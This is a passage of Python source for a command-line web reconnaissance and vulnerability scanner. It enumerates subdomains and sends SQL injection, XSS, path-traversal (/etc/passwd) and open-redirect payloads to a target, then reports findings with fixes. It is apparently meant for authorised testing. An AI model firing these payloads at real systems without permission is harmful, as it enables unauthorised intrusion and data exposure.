    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_probe_path, session, base, p): p for p in words}
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 50 == 0 or done == total:
                print(f"    [{done}/{total}] paths probed...", end="\r", flush=True)
            res = fut.result()
            if res:
                col = RED if res.sensitive else YELLOW
                print(f"\n    {col}[{res.status_code}]{RESET} {res.url}"
                      + (f"  ← {YELLOW}{res.note}{RESET}" if res.note else ""))
                found.append(res)
    print()
    return found

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 6 — SUBDOMAIN ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────

SUBDOMAIN_WORDLIST = [
    # Common infra
    "www","www2","mail","mail2","smtp","pop","pop3","imap",
    "ns","ns1","ns2","dns","dns1","dns2","mx","mx1","relay",
    "ftp","sftp","ssh","vpn","remote","gateway","proxy",
    # Dev / staging
    "dev","development","develop","staging","stage","stg","test","testing",
    "uat","qa","sandbox","demo","beta","alpha","preview","pre",
    "preprod","pre-prod","canary","pilot","lab","poc","int",
    # Admin
    "admin","administrator","manage","management","portal","cpanel","whm",
    "webmail","secure","id","sso","auth","login","accounts","account",
    # APIs
    "api","api2","api-v1","api-v2","apiv2","rest","graphql",
    "gateway","services","service","microservice","backend",
    "internal","private","intranet","extranet",
    # CDN / static
    "cdn","static","assets","media","img","images",
    "files","uploads","download","downloads","s3","storage",
    # Apps
    "app","apps","mobile","m","web","old","legacy","new",
    "store","shop","checkout","pay","payment","invoice",
    "blog","news","forum","community","help","support",
    "docs","documentation","wiki","kb","status","uptime",
    "chat","meet","video","stream","live","broadcast",
    # CI/CD & DevOps
    "git","gitlab","github","bitbucket","jira","confluence",
    "jenkins","ci","cd","build","deploy","docker","registry",
    "k8s","kubernetes","nexus","sonar","artifactory","harbor",
    # Monitoring
    "grafana","kibana","elastic","prometheus","monitor",
    "monitoring","metrics","logs","logging","sentry",
    "alert","alerts","analytics","datadog","splunk",
    # Databases (sometimes exposed)
    "db","database","mysql","postgres","redis","mongo",
    "elasticsearch","solr","cassandra","influx",
    # Mail
    "webmail","autoconfig","autodiscover",
    # Geographic / regional
    "us","eu","uk","asia","au","sg","in","global",
    # Versioned / misc
    "v1","v2","v3","new","old2","bak","backup",
    "cms","wp","wordpress","intranet",
    "affiliate","partner","vendors","client","clients",
]

def _http_probe_sub(session, scheme, fqdn) -> tuple[Optional[int], Optional[str], Optional[str]]:
    for s in (scheme, "https" if scheme=="http" else "http"):
        url = f"{s}://{fqdn}"
        try:
            r = session.get(url, timeout=7, verify=False, allow_redirects=True)
            return r.status_code, _page_title(r.text), r.headers.get("Server","")
        except Exception:
            continue
    return None, None, None

def scan_subdomains(session, target_url, threads=SUB_THREADS,
                    extra_words=None) -> list[DiscoveredSubdomain]:
    parsed      = urlparse(target_url)
    scheme      = parsed.scheme
    hostname    = parsed.hostname or ""
    parts       = hostname.split(".")
    root_domain = ".".join(parts[-2:]) if len(parts) >= 2 else hostname

    words = list(SUBDOMAIN_WORDLIST)
    if extra_words:
        words += [w.strip() for w in extra_words if w.strip()]

    found: list[DiscoveredSubdomain] = []
    seen:  set = set()

    # ── Passive: crt.sh certificate transparency ─────────────────────────
    print(f"    Querying crt.sh for certificate transparency logs...")
    try:
        ct_r = requests.get(
            f"https://crt.sh/?q=%.{root_domain}&output=json",
            timeout=20, headers={"User-Agent": UA}
        )
        if ct_r.ok:
            ct_names: set = set()
            for entry in ct_r.json():
                for line in entry.get("name_value","").splitlines():
                    line = line.strip().lstrip("*.")
                    if line.endswith(root_domain) and "." in line and line != root_domain:
                        ct_names.add(line.lower())
            print(f"    crt.sh: {len(ct_names)} unique subdomains found. Resolving...")
            for fqdn in sorted(ct_names):
                if fqdn in seen: continue
                seen.add(fqdn)
                ip = _resolve(fqdn)
                if not ip:
                    continue
                sc, title, server = _http_probe_sub(session, scheme, fqdn)
                method = "crt.sh+HTTP" if sc else "crt.sh+DNS"
                ds = DiscoveredSubdomain(fqdn, ip, sc, title, server, method)
                found.append(ds)
                col = GREEN if sc and sc < 400 else YELLOW
                print(f"    {col}[crt.sh {sc or 'DNS'}]{RESET} {fqdn}  {ip}"
                      + (f"  [{title}]" if title else ""))
    except Exception as e:
        print(f"    {YELLOW}crt.sh failed: {e}{RESET}")

    # ── Active: DNS brute-force ───────────────────────────────────────────
    total = len(words)
    done  = 0
    print(f"\n    DNS brute-force: {total} candidates on {root_domain}  [{threads} threads]")

    def _worker(word):
        fqdn = f"{word}.{root_domain}"
        if fqdn in seen: return None
        ip = _resolve(fqdn)
        if not ip: return None
        sc, title, server = _http_probe_sub(session, scheme, fqdn)
        return DiscoveredSubdomain(fqdn, ip, sc, title, server, "brute-force")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_worker, w): w for w in words}
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 60 == 0 or done == total:
                print(f"    [{done}/{total}] checked...", end="\r", flush=True)
            res = fut.result()
            if res and res.fqdn not in seen:
                seen.add(res.fqdn)
                found.append(res)
                col   = GREEN if res.status_code and res.status_code < 400 else YELLOW
                sc_s  = str(res.status_code) if res.status_code else "DNS-only"
                title = f"  [{res.title}]" if res.title else ""
                print(f"\n    {col}[{sc_s}]{RESET} {res.fqdn}  {res.ip}{title}")
    print()
    return found

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 7 — SQL INJECTION
# ─────────────────────────────────────────────────────────────────────────────

SQLI_ERRORS = re.compile("|".join([
    r"you have an error in your sql syntax",
    r"warning: mysql", r"mysql_fetch_array\(\)",
    r"unclosed quotation mark after the character string",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver", r"syntax error converting",
    r"ora-\d{5}", r"oracle error",
    r"quoted string not properly terminated",
    r"pg_query\(\)", r"postgresql.*error", r"unterminated quoted string",
    r"sqlite_master", r"sqlite3\.operationalerror",
    r"check the manual that corresponds to your",
    r"unknown column", r"where clause",
    r"sql command not properly ended",
]), re.I)

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
]
SQLI_BOOL_T = "' OR '1'='1' -- -"
SQLI_BOOL_F = "' OR '1'='2' -- -"
SQLI_TIME   = [
    ("MySQL",      "' AND SLEEP(4)-- -",         4),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:4'--", 4),
    ("PostgreSQL", "'; SELECT pg_sleep(4)--",    4),
]
FIX_SQLI = ("Use parameterised queries / prepared statements. Never concatenate "
            "user input into SQL strings. Apply input validation and least-privilege DB accounts.")

def _sqli_error(session, url, param, method, fields=None):
    for pl in SQLI_PAYLOADS:
        time.sleep(ACTIVE_DELAY)
        r = (_safe_get(session, _inject_param(url, param, pl)) if method=="GET"
             else _safe_post(session, url, {**dict(fields or []), param: pl}))
        if r and SQLI_ERRORS.search(r.text):
            return Finding("SQL Injection (Error-based)", "CRITICAL", url, param,
                           method, pl, _snippet(r.text, pl) or "DB error in response",
                           "High", FIX_SQLI)
    return None

def _sqli_bool(session, url, param, baseline, method, fields=None):
    time.sleep(ACTIVE_DELAY)
    if method == "GET":
        rt = _safe_get(session, _inject_param(url, param, SQLI_BOOL_T))
        rf = _safe_get(session, _inject_param(url, param, SQLI_BOOL_F))
    else:
        rt = _safe_post(session, url, {**dict(fields or []), param: SQLI_BOOL_T})
        rf = _safe_post(session, url, {**dict(fields or []), param: SQLI_BOOL_F})
    if not (rt and rf): return None
    lt, lf = len(rt.text), len(rf.text)
    if abs(lt-lf) > 50 and abs(lt-baseline) < abs(lf-baseline):
        return Finding("SQL Injection (Boolean-blind)", "CRITICAL", url, param, method,
                       SQLI_BOOL_T, f"True-len {lt} vs False-len {lf} (baseline {baseline})",
                       "Medium", FIX_SQLI)
    return None

def _sqli_time(session, url, param, method, fields=None):
    for db, pl, delay in SQLI_TIME:
        time.sleep(ACTIVE_DELAY)
        t0 = time.time()
        r  = (_safe_get(session, _inject_param(url, param, pl)) if method=="GET"
              else _safe_post(session, url, {**dict(fields or []), param: pl}))
        elapsed = time.time()-t0
        if r and elapsed >= delay*0.85:
            return Finding(f"SQL Injection (Time-based — {db})", "CRITICAL",
                           url, param, method, pl,
                           f"Response delayed {elapsed:.2f}s (threshold {delay}s)",
                           "Medium", FIX_SQLI)
    return None

def scan_sqli(session, url, html):
    findings, baseline = [], len(html)
    for param in _get_params(url):
        print(f"      SQLi → GET '{param}'")
        f = (_sqli_error(session,url,param,"GET") or
             _sqli_bool(session,url,param,baseline,"GET") or
             _sqli_time(session,url,param,"GET"))
        if f: findings.append(f)
    for form in _extract_forms(html, url):
        for fname, _ in form["fields"]:
            print(f"      SQLi → {form['method']} '{fname}' @ {form['action']}")
            f = (_sqli_error(session,form["action"],fname,form["method"],form["fields"]) or
                 _sqli_time(session,form["action"],fname,form["method"],form["fields"]))
            if f: findings.append(f)
    return findings

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 8 — XSS
# ─────────────────────────────────────────────────────────────────────────────

XSS_MARKER   = "XSS_PROBE_7x9"
XSS_PAYLOADS = [
    f'<script>alert("{XSS_MARKER}")</script>',
    f'"><script>alert("{XSS_MARKER}")</script>',
    f"'><img src=x onerror=alert('{XSS_MARKER}')>",
    f"<img src=x onerror=alert('{XSS_MARKER}')>",
    f'"><svg onload=alert("{XSS_MARKER}")>',
    f"<body onload=alert('{XSS_MARKER}')>",
    f"';alert('{XSS_MARKER}')//",
]
FIX_XSS = ("HTML-encode all user-supplied output. Enforce a strict Content-Security-Policy. "
            "Use textContent instead of innerHTML. Validate and sanitise input server-side.")

def _xss_probe(session, url, param, method, fields=None):
    for pl in XSS_PAYLOADS:
        time.sleep(ACTIVE_DELAY)
        r = (_safe_get(session, _inject_param(url, param, pl)) if method=="GET"
             else _safe_post(session, url, {**dict(fields or []), param: pl}))
        if r and XSS_MARKER in r.text:
            idx = r.text.find(XSS_MARKER)
            ctx = r.text[max(0,idx-30):idx+len(XSS_MARKER)+30]
            if html_mod.escape(XSS_MARKER) not in ctx:
                return Finding("Reflected XSS", "HIGH", url, param, method, pl,
                               _snippet(r.text, XSS_MARKER, 60) or f"Marker reflected",
                               "High", FIX_XSS)
    return None

def scan_xss(session, url, html):
    findings = []
    for param in _get_params(url):
        print(f"      XSS  → GET '{param}'")
        f = _xss_probe(session, url, param, "GET")
        if f: findings.append(f)
    for form in _extract_forms(html, url):
        for fname, _ in form["fields"]:
            print(f"      XSS  → {form['method']} '{fname}' @ {form['action']}")
            f = _xss_probe(session, form["action"], fname, form["method"], form["fields"])
            if f: findings.append(f)
    return findings

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 9 — DIRECTORY TRAVERSAL / LFI
# ─────────────────────────────────────────────────────────────────────────────

LFI_PAYLOADS = [
    ("../../../etc/passwd",               "root:"),
    ("../../../../etc/passwd",            "root:"),
    ("../../../../../etc/passwd",         "root:"),
    ("/etc/passwd",                       "root:"),
    ("%2F%2F%2F%2Fetc%2Fpasswd",          "root:"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",       "root:"),
    ("....//....//....//etc/passwd",      "root:"),
    ("..\\..\\..\\windows\\win.ini",      "[fonts]"),
    ("../../../../windows/win.ini",       "[fonts]"),
    ("../../../etc/passwd\x00.jpg",       "root:"),
]
LFI_PRIORITY_KEYS = ("file","path","page","doc","include","load",
                     "template","name","view","src","dir","folder")
FIX_LFI = ("Never use user input to build file paths. Use an allow-list of permitted "
           "files. Disable allow_url_fopen/allow_url_include in PHP. "
           "Run with least privilege; chroot where possible.")

def scan_lfi(session, url, html):
    findings = []
    params   = _get_params(url)
    priority = [p for p in params if any(k in p.lower() for k in LFI_PRIORITY_KEYS)]
    for param in priority + [p for p in params if p not in priority]:
        print(f"      LFI  → GET '{param}'")
        for pl, sig in LFI_PAYLOADS:
            time.sleep(ACTIVE_DELAY)
            r = _safe_get(session, _inject_param(url, param, pl))
            if r and sig in r.text:
                findings.append(Finding("Directory Traversal / LFI", "HIGH",
                                        url, param, "GET", pl,
                                        _snippet(r.text, sig, 80) or f"Signature '{sig}' found",
                                        "High", FIX_LFI))
                break
    return findings

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 10 — OPEN REDIRECT
# ─────────────────────────────────────────────────────────────────────────────

REDIR_PAYLOADS = [
    "https://evil.example.com","//evil.example.com",
    "//evil.example.com/%2F..","/\\evil.example.com",
    "%2F%2Fevil.example.com","https%3A%2F%2Fevil.example.com",
    "///evil.example.com",
]
REDIR_PARAMS = {"url","redirect","return","next","goto","dest","destination",
                "returnurl","redirecturl","target","link","ref","continue",
                "forward","redir","r","to","out","view","location","callback","back"}
EVIL_HOST = "evil.example.com"
FIX_REDIR = ("Validate redirect targets against a strict allow-list of trusted domains. "
             "Never use user-supplied URLs for redirects. Use relative paths internally.")

def scan_open_redirect(session, url, html):
    findings = []
    params   = _get_params(url)
    priority = [p for p in params if p.lower() in REDIR_PARAMS]
    for param in priority + [p for p in params if p not in priority]:
        print(f"      REDIR→ GET '{param}'")
        for pl in REDIR_PAYLOADS:
            time.sleep(ACTIVE_DELAY)
            r = _safe_get(session, _inject_param(url, param, pl))
            if r is None: continue
            if r.status_code in (301,302,303,307,308) and EVIL_HOST in r.headers.get("Location",""):
                findings.append(Finding("Open Redirect", "MEDIUM", url, param, "GET", pl,
                                        f"Location: {r.headers['Location']}", "High", FIX_REDIR))
                break
            if EVIL_HOST in r.text:
                findings.append(Finding("Open Redirect (Client-side)", "MEDIUM", url, param,
                                        "GET", pl, _snippet(r.text, EVIL_HOST, 80), "Medium", FIX_REDIR))
                break
    return findings

# ─────────────────────────────────────────────────────────────────────────────
# MAIN SCAN ORCHESTRATOR
# ─────────────────────────────────────────────────────────────────────────────

def fetch_target(url):
    try:
        r = requests.get(url, headers={"User-Agent": UA}, timeout=TIMEOUT,
                         verify=False, allow_redirects=True)
        return r, None
    except requests.exceptions.SSLError as e:        return None, f"SSL error: {e}"
    except requests.exceptions.ConnectionError as e: return None, f"Connection error: {e}"
    except requests.exceptions.Timeout:              return None, "Request timed out"
    except Exception as e:                           return None, str(e)

def build_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    s.verify = False
    return s

def scan(
    target,
    max_cves       = 5,
    skip_nvd       = False,
    skip_active    = False,
    run_services   = True,
    run_dirs       = True,
    run_subs       = True,
    modules        = None,
    dir_threads    = DIR_THREADS,
    sub_threads    = SUB_THREADS,
    extra_dirs     = None,
    extra_subs     = None,
) -> ScanResult:

    if not target.startswith(("http://","https://")):
        target = "https://" + target

    result  = ScanResult(target=target)
    session = build_session()

    print(f"\n{BOLD}[*] Target   : {RESET}{target}")
    print(f"{BOLD}[*] Fetching target...{RESET}")

    resp, err = fetch_target(target)
    if err or resp is None:
        msg = err or "No response"
        print(f"{RED}[!] {msg}{RESET}"); result.errors.append(msg); return result

    hostname           = urlparse(resp.url).hostname or ""
    result.ip          = _resolve(hostname)
    result.status_code = resp.status_code
    result.server      = resp.headers.get("Server","Not disclosed")
    html, headers      = resp.text, dict(resp.headers)

    print(f"{GREEN}[+] Status   : {resp.status_code}{RESET}")
    print(f"{GREEN}[+] Server   : {result.server}{RESET}")
    print(f"{GREEN}[+] IP       : {result.ip or 'Could not resolve'}{RESET}")

    # WAF
    wf, wn = detect_waf(resp)
    result.waf_detected, result.waf_name = wf, wn
    print(f"{YELLOW}[!] WAF      : {wn}{RESET}" if wf else f"{GREEN}[+] WAF      : Not detected{RESET}")

    # Technology fingerprint
    print(f"\n{BOLD}[*] Fingerprinting technologies...{RESET}")
    result.technologies = fingerprint(headers, html, resp.url)
    print(f"{GREEN}[+] {len(result.technologies)} technologies identified{RESET}")

    # Service & version detection
    if run_services:
        print(f"\n{BOLD}[*] Detecting services & versions...{RESET}")
        result.services = detect_services(resp, hostname)
        print(f"{GREEN}[+] {len(result.services)} service(s) detected{RESET}")

    # Security headers & cookies
    result.security_headers, result.missing_headers = check_security_headers(headers)
    result.cookies = check_cookies(resp)

    # NVD CVE lookup
    if not skip_nvd:
        print(f"\n{BOLD}[*] Querying NVD for CVEs...{RESET}")
        # Query by technologies
        for tech in result.technologies:
            if tech.category in ("Analytics","CDN"): continue
            label = tech.name + (f" {tech.version}" if tech.version else "")
            print(f"    → tech: {label}")
            cves = query_nvd(tech.name, tech.version, max_cves)
            if cves: result.cves[tech.name] = cves
            time.sleep(NVD_DELAY)
        # Also query services with exact versions
        for svc in result.services:
            if svc.version:
                key = f"{svc.name} (port {svc.port})"
                if key not in result.cves:
                    print(f"    → service: {svc.name} {svc.version}")
                    cves = query_nvd(svc.name, svc.version, max_cves)
                    if cves: result.cves[key] = cves
                    time.sleep(NVD_DELAY)

    # Directory brute-force
    if run_dirs:
        print(f"\n{BOLD}[*] Hidden directory & file discovery...{RESET}")
        result.discovered_paths = scan_directories(
            session, resp.url, threads=dir_threads, extra_words=extra_dirs)
        print(f"{GREEN}[+] {len(result.discovered_paths)} path(s) found{RESET}")

    # Subdomain enumeration
    if run_subs:
        print(f"\n{BOLD}[*] Subdomain enumeration...{RESET}")
        result.discovered_subdomains = scan_subdomains(
            session, resp.url, threads=sub_threads, extra_words=extra_subs)
        print(f"{GREEN}[+] {len(result.discovered_subdomains)} subdomain(s) found{RESET}")

    # Active vulnerability scanning
    if not skip_active:
        mods = set(modules) if modules else {"sqli","xss","lfi","redirect"}
        print(f"\n{BOLD}[*] Active vulnerability scanning...{RESET}")
        if wf: print(f"  {YELLOW}⚠ WAF present — some probes may be blocked{RESET}")
        all_findings = []
        if "sqli"     in mods:
            print(f"\n  {CYAN}[SQLi]{RESET} SQL Injection...")
            all_findings += scan_sqli(session, resp.url, html)
        if "xss"      in mods:
            print(f"\n  {CYAN}[XSS]{RESET} Cross-Site Scripting...")
            all_findings += scan_xss(session, resp.url, html)
        if "lfi"      in mods:
            print(f"\n  {CYAN}[LFI]{RESET} Directory Traversal / LFI...")
            all_findings += scan_lfi(session, resp.url, html)
        if "redirect" in mods:
            print(f"\n  {CYAN}[REDIR]{RESET} Open Redirect...")
            all_findings += scan_open_redirect(session, resp.url, html)
        result.findings = all_findings
        col = RED if all_findings else GREEN
        print(f"\n{col}[+] Active scan complete — {len(all_findings)} finding(s){RESET}")

    return result

# ─────────────────────────────────────────────────────────────────────────────
# REPORT PRINTER
# ─────────────────────────────────────────────────────────────────────────────

def print_report(r: ScanResult):
    div  = f"{CYAN}{'─'*68}{RESET}"
    div2 = f"{CYAN}{'╌'*68}{RESET}"
    print(f"\n{div}")
    print(f"{BOLD}{CYAN}  SCAN REPORT  ·  {r.target}{RESET}")
    print(f"  IP: {r.ip or 'N/A'}   Status: {r.status_code}   Server: {r.server}")
    print(div)

    # WAF
    if r.waf_detected:
        print(f"\n  {YELLOW}{BOLD}⚠  WAF Detected: {r.waf_name}{RESET}")
    else:
        print(f"\n  {GREEN}✔  No WAF detected{RESET}")

    # ── Technologies ───────────────────────────────────────────────────────
    print(f"\n{BOLD}  ■ TECHNOLOGIES  ({len(r.technologies)}){RESET}")
    cats: dict = {}
    for t in r.technologies: cats.setdefault(t.category,[]).append(t)
    for cat, items in cats.items():
        print(f"\n  {MAGENTA}{cat}{RESET}")
        for t in items:
            ver  = f" {YELLOW}v{t.version}{RESET}" if t.version else ""
            conf = GREEN if t.confidence=="High" else YELLOW
            print(f"    ├─ {BOLD}{t.name}{RESET}{ver}  [{conf}{t.confidence}{RESET}]")

    # ── Services ───────────────────────────────────────────────────────────
    if r.services:
        print(f"\n{BOLD}  ■ DETECTED SERVICES & VERSIONS  ({len(r.services)}){RESET}")
        by_port: dict = {}
        for s in r.services: by_port.setdefault(s.port,[]).append(s)
        for port in sorted(by_port.keys(), key=lambda x: (x is None, x)):
            for s in by_port[port]:
                ver_s = f" {YELLOW}v{s.version}{RESET}" if s.version else f" {YELLOW}(version unknown){RESET}"
                proto = f" [{s.protocol}]" if s.protocol else ""
                port_s= f":{port}" if port else ""
                print(f"    {GREEN}►{RESET} {BOLD}{s.name}{RESET}{ver_s}  "
                      f"{CYAN}port{port_s}{proto}{RESET}")
                if s.banner:
                    print(f"      {s.banner[:100]}")
    else:
        print(f"\n  {YELLOW}No services detected beyond HTTP headers{RESET}")

    # ── Security headers ───────────────────────────────────────────────────
    print(f"\n{BOLD}  ■ SECURITY HEADERS{RESET}")
    for hdr, val in r.security_headers.items():
        print(f"  {GREEN}✔ {hdr}{RESET}: {val[:80]}")
    for hdr in r.missing_headers:
        print(f"  {RED}✘ MISSING — {hdr}{RESET}  ({SECURITY_HEADERS.get(hdr,'')})")

    # ── Cookies ────────────────────────────────────────────────────────────
    if r.cookies:
        print(f"\n{BOLD}  ■ COOKIE ISSUES{RESET}")
        for c in r.cookies:
            print(f"  {YELLOW}Cookie '{c['name']}'{RESET}: {', '.join(c['issues'])}")
    else:
        print(f"\n  {GREEN}✔  No insecure cookie flags{RESET}")

    # ── Hidden paths ───────────────────────────────────────────────────────
    if r.discovered_paths:
        sensitive = [p for p in r.discovered_paths if p.sensitive]
        others    = [p for p in r.discovered_paths if not p.sensitive]
        print(f"\n{BOLD}  ■ HIDDEN PATHS  ({len(r.discovered_paths)} found — "
              f"{RED}{len(sensitive)} sensitive{RESET}{BOLD}){RESET}")
        if sensitive:
            print(f"\n  {RED}── Sensitive{RESET}")
            for p in sensitive:
                note = f"  ← {p.note}" if p.note else ""
                print(f"  {RED}[{p.status_code}]{RESET} {BOLD}{p.url}{RESET}"
                      f"  {p.content_type[:30]}{YELLOW}{note}{RESET}")
        if others:
            print(f"\n  {YELLOW}── Other{RESET}")
            for p in others:
                note = f"  ← {p.note}" if p.note else ""
                print(f"  {YELLOW}[{p.status_code}]{RESET} {p.url}{note}")
    else:
        print(f"\n  {GREEN}✔  No hidden paths found{RESET}")

    # ── Subdomains ─────────────────────────────────────────────────────────
    if r.discovered_subdomains:
        live = [s for s in r.discovered_subdomains if s.status_code and s.status_code < 400]
        print(f"\n{BOLD}  ■ SUBDOMAINS  ({len(r.discovered_subdomains)} found — "
              f"{GREEN}{len(live)} live{RESET}{BOLD}){RESET}")
        for s in sorted(r.discovered_subdomains, key=lambda x: (x.status_code or 999)):
            col   = GREEN if s.status_code and s.status_code < 400 else YELLOW
            sc    = str(s.status_code) if s.status_code else "DNS"
            ip    = f"  {CYAN}{s.ip}{RESET}" if s.ip else ""
            title = f"  [{s.title}]" if s.title else ""
            srv   = f"  {s.server}" if s.server else ""
            src   = f"  {MAGENTA}({s.source}){RESET}"
            print(f"  {col}[{sc}]{RESET} {BOLD}{s.fqdn}{RESET}{ip}{title}{srv}{src}")
    else:
        print(f"\n  {GREEN}✔  No subdomains discovered{RESET}")

    # ── Active findings ────────────────────────────────────────────────────
    if r.findings:
        print(f"\n{BOLD}  ■ ACTIVE VULNERABILITY FINDINGS  ({len(r.findings)}){RESET}")
        for i, f in enumerate(r.findings, 1):
            print(f"\n  {BOLD}[{i}] {f.vuln_type}{RESET}  —  {_cs(f.severity)}  [{f.confidence} confidence]")
            print(f"      URL       : {f.url}")
            print(f"      Parameter : {f.parameter}  ({f.method})")
            print(f"      Payload   : {f.payload[:120]}")
            if f.evidence:    print(f"      Evidence  : {f.evidence[:200]}")
            if f.remediation:
                print(f"      Fix       :")
                print(_wrap(f.remediation, 60, "                "))
    else:
        print(f"\n  {GREEN}✔  No active vulnerabilities found{RESET}")

    # ── CVEs ───────────────────────────────────────────────────────────────
    if r.cves:
        print(f"\n{BOLD}  ■ CVEs / KNOWN VULNERABILITIES{RESET}")
        for tech, cves in r.cves.items():
            print(f"\n  {MAGENTA}[{tech}]{RESET}")
            for cve in cves:
                sc  = (f"{BOLD}{cve.cvss_score:.1f}{RESET} CVSSv{cve.cvss_version}"
                       if cve.cvss_score is not None else "N/A")
                print(f"\n    {BOLD}{cve.cve_id}{RESET}  "
                      f"Score: {sc}  Severity: {_cs(cve.severity or 'Unknown')}")
                print(f"    Published : {cve.published}")
                print(f"    Details   : {cve.url}")
                if cve.description: print(_wrap(cve.description, 66, "    "))
    elif not r.errors:
        print(f"\n  {GREEN}✔  No CVEs found (or NVD lookup skipped){RESET}")

    # ── Errors ─────────────────────────────────────────────────────────────
    if r.errors:
        print(f"\n{BOLD}  ■ ERRORS{RESET}")
        for e in r.errors: print(f"  {RED}✘ {e}{RESET}")

    # ── Summary ────────────────────────────────────────────────────────────
    fc = {"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0}
    for f in r.findings: fc[f.severity] = fc.get(f.severity,0)+1
    print(f"\n{div}")
    print(f"{BOLD}  SUMMARY{RESET}")
    print(f"  IP Address      : {r.ip or 'N/A'}")
    print(f"  WAF             : {r.waf_name if r.waf_detected else 'None detected'}")
    print(f"  Technologies    : {len(r.technologies)}")
    print(f"  Services found  : {len(r.services)}")
    print(f"  Hidden paths    : {len(r.discovered_paths)}"
          + (f"  ({RED}{sum(1 for p in r.discovered_paths if p.sensitive)} sensitive{RESET})"
             if r.discovered_paths else ""))
    print(f"  Subdomains      : {len(r.discovered_subdomains)}"
          + (f"  ({GREEN}{sum(1 for s in r.discovered_subdomains if s.status_code and s.status_code<400)} live{RESET})"
             if r.discovered_subdomains else ""))
    print(f"  Missing headers : {len(r.missing_headers)}")
    print(f"  Vulnerabilities : "
          f"{RED}{BOLD}CRITICAL {fc['CRITICAL']}  {RESET}"
          f"{RED}HIGH {fc['HIGH']}  {RESET}"
          f"{YELLOW}MEDIUM {fc['MEDIUM']}  {RESET}"
          f"{GREEN}LOW {fc['LOW']}{RESET}")
    print(f"  CVEs found      : {sum(len(v) for v in r.cves.values())}")
    print(f"{div}\n")

# ─────────────────────────────────────────────────────────────────────────────
# JSON SERIALISATION
# ─────────────────────────────────────────────────────────────────────────────

def result_to_dict(r: ScanResult):
    d = asdict(r)
    d["cves"]                  = {k:[asdict(c) for c in v] for k,v in r.cves.items()}
    d["findings"]              = [asdict(f) for f in r.findings]
    d["technologies"]          = [asdict(t) for t in r.technologies]
    d["services"]              = [asdict(s) for s in r.services]
    d["discovered_paths"]      = [asdict(p) for p in r.discovered_paths]
    d["discovered_subdomains"] = [asdict(s) for s in r.discovered_subdomains]
    return d

# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="WebAnalyzer — Advanced Web Reconnaissance & Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  python3 webanalyzer.py https://testphp.vulnweb.com
  python3 webanalyzer.py https://example.com --skip-active --skip-subs
  python3 webanalyzer.py https://example.com --modules sqli xss --skip-nvd
  python3 webanalyzer.py https://example.com --output report.json
  python3 webanalyzer.py https://example.com --extra-dirs admin secret --extra-subs dev api

Good legal test targets:
  https://testphp.vulnweb.com     (Acunetix demo — SQLi, XSS, LFI)
  https://demo.testfire.net        (IBM AltoroMutual)
  https://juice-shop.herokuapp.com (OWASP Juice Shop)

⚠  Only scan systems you own or have written authorisation to test.
        """)
    p.add_argument("url",            help="Target URL")
    p.add_argument("--max-cves",     type=int, default=5,
                   help="Max CVEs per technology/service (default: 5)")
    p.add_argument("--skip-nvd",     action="store_true",
                   help="Skip NVD CVE lookup")
    p.add_argument("--skip-active",  action="store_true",
                   help="Skip all active vuln scanning")
    p.add_argument("--skip-services",action="store_true",
                   help="Skip service/version detection (no TCP probing)")
    p.add_argument("--skip-dirs",    action="store_true",
                   help="Skip hidden directory brute-force")
    p.add_argument("--skip-subs",    action="store_true",
                   help="Skip subdomain enumeration")
    p.add_argument("--modules",      nargs="+",
                   choices=["sqli","xss","lfi","redirect"],
                   help="Run only specific active vuln modules")
    p.add_argument("--dir-threads",  type=int, default=DIR_THREADS,
                   help=f"Threads for dir brute-force (default: {DIR_THREADS})")
    p.add_argument("--sub-threads",  type=int, default=SUB_THREADS,
                   help=f"Threads for subdomain enum (default: {SUB_THREADS})")
    p.add_argument("--extra-dirs",   nargs="+", metavar="PATH",
                   help="Extra directory paths to probe")
    p.add_argument("--extra-subs",   nargs="+", metavar="WORD",
                   help="Extra subdomain words to try")
    p.add_argument("--json",         action="store_true",
                   help="Print full JSON to stdout")
    p.add_argument("--output",       metavar="FILE",
                   help="Save JSON report to file")
    return p.parse_args()

def main():
    banner()
    args = parse_args()
    result = scan(
        target        = args.url,
        max_cves      = args.max_cves,
        skip_nvd      = args.skip_nvd,
        skip_active   = args.skip_active,
        run_services  = not args.skip_services,
        run_dirs      = not args.skip_dirs,
        run_subs      = not args.skip_subs,
        modules       = args.modules,
        dir_threads   = args.dir_threads,
        sub_threads   = args.sub_threads,
        extra_dirs    = args.extra_dirs,
        extra_subs    = args.extra_subs,
    )
    print_report(result)
    if args.json or args.output:
        data = result_to_dict(result)
        if args.json:
            print(json.dumps(data, indent=2))
        if args.output:
            with open(args.output,"w") as fh:
                json.dump(data, fh, indent=2)
            print(f"{GREEN}[+] JSON report saved → {args.output}{RESET}")

if __name__ == "__main__":
    main()
